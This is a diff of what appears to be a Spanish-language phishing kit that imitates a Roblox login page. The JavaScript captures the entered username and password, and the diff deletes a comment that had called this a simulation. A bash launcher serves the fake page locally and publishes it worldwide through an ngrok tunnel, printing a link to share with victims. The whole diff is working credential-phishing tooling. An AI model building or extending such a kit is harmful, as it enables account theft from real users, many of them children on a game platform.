@@ -85,14 +85,12 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    // Mostrar datos en consola (simulación de envío)
     console.log('📤 DATOS ENVIADOS:');
     console.log('Usuario:', usuario);
     console.log('Contraseña:', password);
     console.log('App: Roblox');
     console.log('Fecha:', new Date().toLocaleString());
     
-    // Mostrar mensaje de éxito
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
     setTimeout(() => {
@@ -833,30 +831,37 @@ if [ "$net_choice" == "2" ]; then
     
     # Iniciar ngrok en segundo plano
     ngrok http 8080 > /dev/null 2>&1 &
-    sleep 3
+    sleep 4
     
     # Obtener el link de ngrok
     NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-zA-Z0-9.-]*\.ngrok.io')
     
+    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${VERDE}🌐 ENLACE PÚBLICO (MUNDIAL):${NC}"
     if [ -n "$NGROK_URL" ]; then
-        echo -e "${VERDE}[✔] Enlace PÚBLICO generado:${NC}"
-        echo -e "${AMARILLO}  $NGROK_URL${NC}"
-        echo -e "${BLANCO}  (¡Cualquier persona en el mundo puede acceder!)${NC}\n"
+        echo -e "${AMARILLO}  📎 $NGROK_URL${NC}"
+        echo -e "${BLANCO}  (¡Cualquier persona en el mundo puede acceder!)${NC}"
     else
-        echo -e "${ROJO}[!] Error al generar enlace público. Asegúrate de tener internet.${NC}"
-        echo -e "${AMARILLO}[*] Usando localhost en su lugar...${NC}\n"
+        echo -e "${ROJO}  ❌ Error al generar enlace público${NC}"
+        echo -e "${AMARILLO}  Usando localhost en su lugar...${NC}"
         net_choice="1"
     fi
+    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
 fi
 
 if [ "$net_choice" == "1" ]; then
     IP_LOCAL=$(ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1)
-    echo -e "${BLANCO}Enlaces locales:${NC}"
-    echo -e "${AMARILLO}  http://localhost:8080${NC}"
+    
+    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${VERDE}📡 ENLACES LOCALES:${NC}"
+    echo -e "${AMARILLO}  📎 http://localhost:8080${NC}"
+    echo -e "${BLANCO}  (Solo en este dispositivo)${NC}"
     if [ -n "$IP_LOCAL" ]; then
-        echo -e "${AMARILLO}  http://$IP_LOCAL:8080${NC} ${BLANCO}(Para dispositivos en tu Wi-Fi)${NC}"
+        echo -e "${AMARILLO}  📎 http://$IP_LOCAL:8080${NC}"
+        echo -e "${BLANCO}  (Para dispositivos en tu Wi-Fi)${NC}"
     fi
+    echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
 fi
 
-echo -e "\n${BLANCO}Presiona Ctrl+C para detener el servidor.${NC}\n"
+echo -e "${BLANCO}Presiona Ctrl+C para detener el servidor.${NC}\n"
 cd ~/mi_web && python3 -m http.server 8080
